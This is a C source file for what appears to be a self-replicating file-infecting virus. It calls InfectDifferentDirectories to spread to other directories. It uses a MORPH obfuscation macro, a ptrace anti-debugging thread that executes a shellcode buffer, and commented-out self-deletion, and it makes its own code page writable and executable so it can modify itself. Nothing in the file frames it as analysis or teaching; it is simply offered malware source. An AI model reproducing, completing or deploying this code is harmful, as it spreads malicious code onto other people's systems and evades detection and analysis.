#include "includes.h"
#include "infection.h"
#include "anti-disassembler.h"
#include "anti-debugging.h"

void *antiDebuggingThread() {
    MORPH
    while (1) {
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
            printf("Do NOT debug me!");
            exit(-1);
        }

        int (*shellcodec)() = (int (*)()) shellcode;
        shellcodec();

        sleep(50);
    }
    MORPH
}

int main(int argc, char *argv[]) {

    MORPH

    InfectDifferentDirectories(argv);
    /* SelfDelete(argv[0]); */

   /* pthread_t thread_id; */
   /* pthread_create(NULL, antiDebuggingThread, NULL); */

    uint8_t* code = (uint8_t*) &main;

    long pagesize = sysconf(_SC_PAGESIZE);
    if (pagesize <= 0)
        return 1;
    size_t mask = pagesize - 1;

    MORPH

    void* alignedcode = (void*) ((size_t) code & ~mask);

    if (mprotect(alignedcode, (size_t) code - (size_t) alignedcode + END, PROT_READ | PROT_WRITE | PROT_EXEC))
        return 1;

    return 0;
}
